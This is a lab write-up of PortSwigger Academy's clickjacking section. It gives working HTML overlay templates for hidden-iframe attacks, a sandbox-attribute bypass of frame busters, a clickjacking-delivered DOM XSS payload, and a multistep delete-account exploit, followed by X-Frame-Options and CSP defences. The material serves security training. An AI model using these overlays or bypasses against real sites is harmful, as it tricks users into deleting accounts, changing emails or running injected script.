# Clickjacking (UI redressing) [PortSwigger Academy]

<sup>This write-up covers the Clickjacking (UI redressing) section of Web Security Academy by PortSwigger.</sup>

## What is clickjacking

Clickjacking is a type of user interface attack where a victim is tricked into clicking on hidden elements from another website while thinking they're interacting with visible content on a decoy site. For example, a user might visit a fake website (maybe through a link in an email) and click a button to "claim a prize". Without realizing it, they are actually clicking a hidden button underneath that could, say, transfer money from their account on a different site. This attack typically involves embedding an invisible, interactive page inside an iframe, positioned over the decoy site's content. Unlike CSRF attacks, which forge entire requests without any direct user interaction, clickjacking relies on deceiving the user into performing a specific action, like clikcing a button.

### What is clickjacking? - Continued

CSRF protection typically relies on a CSRF token --- a session-specific, one-time-use value or nonce. However, CSRF tokens don't defend against clickjacking attacks because the user's session remains active, and all interactions happen within the legitimate site's domain. Even though CSRF tokens are correctly included in requests and submitted to the server as part of a normal session, the key difference is that the interaction takes place within a hidden iframe. 

## How to construct a basic clickjacking attack

Clickjacking attacks often rely on CSS to control and layer elements on a page. The attacker embeds the target website inside an iframe, positioning it on top of the decoy website. Here's an example using the `<style>` tag and specific CSS settings:

```html
<head>
  <style>
    #target_website {
      position: relative;
      width: 128px;
      height: 128px;
      opacity: 0.00001;
      z-index: 2;
    }
    #decoy_website {
      position: absolute;
      width: 300px;
      height: 400px;
      z-index: 1;
    }
  </style>
</head>
...
<body>
  <div id="decoy_website">
    ...decoy web content here...
  </div>
  <iframe id="target_website" src="https://vulnerable-website.com">
  </iframe>
</body>
```

In this setup, the iframe containing the vulnerable site is made nearly invisible and layered above the decoy content, tricking users into interacting with the hidden page.

- `position: relative` (on `#target_website`) --- Positions the frame normally, but allows it to be moved around later if needed. (Relative positioning means it will move _relative to itself_, not the whole page.)

- `position: absolute` (on `#decoy_website`) --- Removes the decoy div from the normal page flow and places it exactly where specified. (In this case, it lets the decoy layer be exactly under the iframe.)

- `width` and `height` --- Set the size of the div and iframe. (Here, the iframe is made small -- _128px by 128px_ -- and placed above a larger decoy page --- _300px by 400px_.)

- `opacity: 0.00001` --- Makes the iframe almost fully transparent (basically invisible) but _still clickable_. (This is key --- if it were `opacity: 0`, it might not capture clicks depending on the browser.)

- `z-index` --- Controls the layer stacking order: `z-index: 2` (target iframe) is higher than `z-index: 1` (decoy content), so the hidden iframe sits on top of the decoy. (Higher `z-index` means "closer to the user's screen")

The attacker hides the real target (`iframe`) almost completely transparent over the fake ("decoy") page. When the victim clicks something on the fake page, they are actually clicking on the real (hidden) target underneath. 

### How to construct a basic clickjacking attack - Continued

The target website's iframe is carefully positioned within the browser so that its actionable element precisely lines up with the content on the decoy site, using specific width, height, and positioning settings. Relative and absolute positioning are used to make sure the iframe consistently overlays the decoy content, no matter the screen size, browser, or platform. The `z-index` property controls which layer appears on top. To make the iframe invisible to the user, its opacity is set to 0.0 or very close to 0.0. Some browsers, like Chrome (starting from version 76), may have clickjacking protections that detect extremely transparent iframes, while others like Firefox might not. To bypass these protections, attackers fine-tune the opacity to remain low enough for invisibility but high enough to avoid triggering security measures. 

## Lab: Basic clickjacking with CSRF token protection

First, log in to your account on the target website with credentials `wiener:peter`.

Next, head over to the exploit server and paste this HTML template in to the "Body" field:

```
<style>
    iframe {
        position: relative;
        width: $width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position: absolute;
        top: $top_value;
        left: $side_value;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```

Then customize the template with the following changes:

- Replace `YOUR-LAB-ID` in the iframe `src` attribute with your own lab ID.
- Set appropriate pixel values for `$height_value` and `$width_value` (`800px` and `600px` worked for me).
- Set `$opacity` to make the iframe nearly invisible. Start with an opacity of `0.1` for easier alighnment, then lower it to `0.0001` before delivering to victim.
- Adjust `$top_value` and `$side_value` for the decoy content so the "Delete account" button and "Test me" overlay properly (`500px` for top and `100px` for left worked for me). 

Click "Store" and then "View exploit".

Hover your mouse over the __Test me__ text --- if the cursor changes to a hand icon, it means the div element is correctly aligned. __IMPORTANT:__ _DO NOT_ click the "Delete account" button yourself. If you do, the lab will break, and you'll have to wait about 20 minutes for it to reset. 

If the div isn't lined up properly, tweak the `top` and `left` values in the CSS to adjust the positioning.

Once everything is properly aligned, change the text from "Test me" to "Click me", then click "Store" again. 

Finally, hit "Deliver exploit to victim" to solve the lab.

## Clickbandit

While you can manually build a clickjacking proof of concept using the method described earlier, it can be quite tedious and time-consuming. When testing for clickjacking vulnerabilities in real-world applications, it's better to use Burp's __Clickbandit__ tool. This tool allows you to perform the needed actions directly in your browser on a page that can be framed, and then automatically generates an HTML file with the correct clickjacking overlay. With Clickbandit, you can create an interactive proof of concept in just a few seconds --- no need to write any HTML or CSS yourself. 

## Clickjacking with prefilled form input

Some websites that involve filling out and submitting forms allow form fields to be pre-filled using GET parameters before submission. Other sites might require certain text inputs before a form can be submitted. Since GET parameters are part of the URL, an attacker can modify the target URL to include values they choose. Then, just like in a basic clickjacking attack, the transparent "submit" button from the target site can be overlaid onto the decoy website. 

### Lab: Clickjacking with form input data prefilled from a URL parameter

Log in to your account with `wiener:peter`

Go to the exploit server and paste the following HTML code into the "Body" section:

```html
<style>
    iframe {
        position: relative;
        width: $width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position: absolute;
        top: $top_value;
        left: $side_value;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```

Replace `YOUR-LAB-ID` with your own lab ID (`https://` preceding) so that the iframe points to the user account page containing the "Update email" form. 

Set appropriate pixel values for `$width_value` and `$height_value`. (`800px` and `600px` worked for me)

Set `$opacity` to make the iframe transparent. Start with `0.1` for easier alignment, then lower it to `0.0001` before delivering to victim. 

Click "Store" and then "View exploit". Hover your mouse over "Test me" to ceck that the cursor turns into a hand icon, confirming the div is properly positioned. If not, tweak the top and left values as needed. 

Once aligned, change "Test me" to "Click me" and save it again by clicking "Store". Modify the email address in the iframe URL if needed, so it's different from your own. 

Click "Deliver exploit to victim" to solve the lab. 

## Frame busting scripts

Clickjacking attacks become possible whenever a website allows itself to be loaded inside a frame. To prevent this, defenses typically focus on restricting framing. One common client-side method relies on using frame busting or frame breaking scripts within the browser. These protections can also come from browser extensions like NoScript. Such scripts are often designed to:

- Verify that the application is running in the top-level window.
- Force all frames to be visible.
- Block clicks on invisible frames.
- Detect and warn users about possible clickjacking attempts.

### Frame busting scripts - Continued

Frame busting techniques are often specific to certain browsers and platforms, and due to the flexible nature of HTML, attackers can usually find ways around them. Since frame busters rely on JavaScript, they may fail if the user's browser has JavaScript disabled or doesn't support it at all. A common method attackers use to bypass frame busters is by applying the HTML5 `iframe` `sandbox` attribute. If the sandbox allows `forms` or `scripts` but does not allow `top-navigation`, then frame busting scripts can't detect whether they're in the top window, effectively disabling them:

```html
<iframe id="victim_website" src="https://victim-website.com" sandbox="allow-forms"></iframe>
```

Both `allow-forms` and `allow-scripts` let certain features work inside the iframe, but by blocking top-level navigation, the frame busting protections are neutralized while the target site remains functional. 

### Lab: Clickjacking with a frame buster script

Log in as `wiener:peter`

Head over to the exploit server and paste the following HTML template into the "Body" section: 

```html
<style>
    iframe {
        position: relative;
        width: $width_value;
        height: $height_value;
        opacity: $opacity;
        z-index: 2;
    }
    div {
        position: absolute;
        top: $top_value;
        left: $side_value;
        z-index: 1;
    }
</style>
<div>Test me</div>
<iframe sandbox="allow-forms"
src="YOUR-LAB-ID.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>
```

Replace `YOUR-LAB-ID` in the frame `src` with your specific lab ID, so the link points to the target site's user account page containing the "Update email" form. 

Set suitable pixel values for `$width_value` and `$height_value` (`800px` and `600px` worked for me)

Adjust `$top_value` and `$side_value` to align the "Update email" button with the "Test me" text (`450px` and `80px` worked for me)

Take note: adding `sandbox="allow forms"` disables the frame buster, allowing your clickjacking setup to work. 

Click "Store" and then "View exploit". Hover over "Test me" and make sure the cursor turns into a hand, confirming the div is aligned. If not, tweak the `top` and `left` CSS values until it fits properly. 

Once it's properly positioned, change "Test me" to "Click me" and hit "Store". Update the email address in the URL if needed, so it's different from your own. 

Click "Deliver exploit to victim" to solve the lab. 

## Combining clickjacking with a DOM XSS attack

Up to this point, we've discussed clickjacking as a standalone attack. In the past, it has been used for simple actions like artificially increasing "likes" on Facebook pages. However, clickjacking becomes far more powerful when it's used as a delivery method for another attack, such as a DOM-based XSS. Setting up this combined attack is fairly easy once the attacker has discovered a suitable XSS vulnerability. The attacker simply merges the XSS payload into the iframe's target URL, so that when the user clicks the hidden button or link, it triggers the DOM XSS attack. 

### Lab: Exploiting clickjacking vulnerability to trigger DOM-based XSS

Open the exploit server and paste the following HTML template into the "Body" field:

```html
<style>
    iframe {
        position:relative;
        width:$width_value;
        height:$height_value;
        opacity:$opacity;
        z-index:2;
    }
    div {
        position:absolute;
        top:$top_value;
        left:$side_value;
        z-index:1;
    }
</style>
<div>Test me</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/feedback?name=<img src=1 onerror=print()>&email=hacker@attacker-website.com&subject=test&message=test#feedbackResult"></iframe>
```

Replace `YOUR-LAB-ID` in the iframe’s `src` attribute with your personal lab ID so the URL points to the "Submit feedback" page of the target site.

Set appropriate pixel values for `$height_value` and `$width_value` (`800px` and `600px` worked for me).

Adjust the `$top_value` and `$side_value` properties so that the "Submit feedback" button and the "Test me" decoy element line up correctly (`515px` and `75px` worked for me).

Set the $opacity so the iframe is transparent — start with 0.1 for easier alignment, then switch to 0.0001 for the final exploit.

Click "Store" and then "View exploit". Hover over "Test me" and confirm the cursor changes to a hand, indicating correct positioning. If not, tweak the top and left style settings until it lines up perfectly.

Click "Test me" — the print dialog should appear. Change the text from "Test me" to "Click me" and save by clicking "Store". Finally, click "Deliver exploit to victim" to complete and solve the lab.

## Multistep clickjacking

Sometimes, an attacker needs to perform several steps to manipulate inputs on a target website. For instance, if the goal is to trick a user into making a purchase on an online store, the attacker must first add items to the cart before submitting the order. To accomplish this, the attacker can use multiple `<div>` elements or iframes layered within the page. Pulling off this kind of attack demands a high level of accuracy and careful planning to ensure it works smoothly and remains unnoticed. 

Log into your account as `wiener:peter` and navigate to the user account page.

Open the exploit server, paste the following HTML into the "Body" section:

```html
<style>
	iframe {
		position:relative;
		width:$width_value;
		height:$height_value;
		opacity:$opacity;
		z-index:2;
	}
	.firstClick, .secondClick {
		position:absolute;
		top:$top_value1;
		left:$side_value1;
		z-index:1;
	}
	.secondClick {
		top:$top_value2;
		left:$side_value2;
	}
</style>
<div class="firstClick">Test me first</div>
<div class="secondClick">Test me next</div>
<iframe src="YOUR-LAB-ID.web-security-academy.net/my-account"></iframe>
```

Replace `YOUR-LAB-ID` with your actual lab ID so it correctly links to the account page.

Set appropriate pixel values for `$width_value` and `$height_value` (`800px` and `600px` worked for me)

Adjust `$top_value1` and `$side_value1` to align "Test me first" with the "Delete account" button (`495px` and `50px` worked for me)

Set `$top_value2` and `$side_value2` to align "Test me next" with the "Yes" button on the confirmation page (`290px` and `205px` worked for me)

Set `$opacity` to make the iframe transparent. Start with 0.1 to help with alignment; for the final attack, use 0.0001.

Click "Store" and then "View exploit"

Hover over "Test me first" and check that the cursor changes to a hand. if it doesn't line up properly, tweak the `top` and `left` values inside the `.firstClick` class.

Click "Test me first" then hover over "Test me next". Confirm that the cursor again changes to a hand. Adjust the `.secondClick` class if needed.

Once everything lines up change "Test me first" to "Click me first" and "Test me next" to "Click me next" and click "Store" again. Click "Deliver exploit to victim" to solve the lab. 

## How to prevent clickjacking attacks

Earlier, we explored browser-based defenses like frame busting scripts. However, we've also seen that attackers can often bypass these measures fairly easily. As a result, sever-side protocols have been developed to limit the use of iframes and help defend against clickjacking. 

Since clickjacking exploits browser behavior, its effectiveness relies on how browsers operate and how closely they follow web standards and best practices. Server-side defenses work by setting rules that restrict the use of iframe components, but these protections are only effective if browsers properly recognize and enforce them. Two main server-side methods for preventing clickjacking are the `X-Frame-Options` header and `Content Security Policy` (CSP). 

## X-Frame-Options

The `X-Frame-Options` header was first introduced unofficially in Internet Explorer 8 and was quickly adopted by other browsers. It allows website owners to control whether their pages can be embedded in iframes or similar elements. To ocmpletely block framing, the `deny` directive is used: 

```
X-Frame-Options: deny
```

Alternatively, framing can be limited to the same origin as the site using the `sameorigin` directive.

```
X-Frame-Options: sameorigin
```

Or, it can be restricted to specific trusted site using the `allow-from` directive.

```
X-Frame-Options: allow-from https://normal-website.com
```

However, browser support for `X-Frame-Options` is inconsistent --- for example, the `allow-from` directive isn't supported in Chrome 76 or Safari 12. Despite this, when combined with a Content Security Policy (CSP) as part of a layered security approach, `X-Frame-Options` can still offer strong protection against clickjacking.

## Content Security Policy (CSP)

Content Security Policy is a security feature designed to detect and prevent attacks like XSS and clickjacking. It is typically set on the web server as a response header in this format:

```
Content-Security-Policy: policy
```

Here, `policy` refers to a series of directives separated by semicolons. These directives tell the browser which sources of content are allowed, helping the browser to identify and block potentially malicious activity. 

## Content Security Policy (CSP) - Continued

The best practice for defending against clickjacking is to use the `frame-ancestors` directive within the site's Content Security Policy (CSP). Setting `frame-ancestors 'none'` works similarly to the `X-Frame-Options: deny` directive, while `frame-ancestors 'self'` behaves like `X-Frame-Options: sameorigin`. For example, the following CSP allows framing only from the same domain:

```
Content-Security-Policy: frame-ancestors 'self';
```

You can also allow framing by specific trusted sites:

```
Content-Security-Policy: frame-ancestors normal-website.com;
```

To effectively defend against clickjacking and XSS, CSPs must be carefully designed, implemented and tested, and should be part of a broader, layered security approach. 

> Next write-up: [GraphQL API vulnerabilities](../psa_graphql/README.md)
